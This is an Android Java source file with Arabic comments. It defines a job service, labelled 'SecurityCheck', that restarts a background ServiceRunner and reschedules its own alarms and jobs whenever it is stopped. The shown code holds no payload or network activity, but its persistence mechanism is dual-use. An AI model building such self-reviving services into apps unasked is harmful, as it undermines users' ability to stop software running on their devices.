package com.sec.check;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

public class KeepAliveJobService extends JobService {

    private static final String TAG = "SecurityCheck";

    @Override
    public boolean onStartJob(JobParameters params) {
        Log.d(TAG, "[JOB] onStartJob");

        try {
            // شغّل ServiceRunner
            Intent intent = new Intent(this, ServiceRunner.class);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }

            // أعد جدولة Alarm
            PersistenceManager.scheduleAlarm(this);
            PersistenceManager.scheduleRepeatingAlarm(this);

        } catch (Exception e) {
            Log.e(TAG, "[JOB] error: " + e.getMessage());
        }

        // false = خلص الشغل، مش محتاج reschedule
        return false;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        Log.d(TAG, "[JOB] onStopJob — rescheduling");

        try {
            // أعد جدولة Job
            PersistenceManager.scheduleJob(this);
        } catch (Exception e) {
            Log.e(TAG, "[JOB] reschedule error: " + e.getMessage());
        }

        // true = أعد الجدولة
        return true;
    }
}
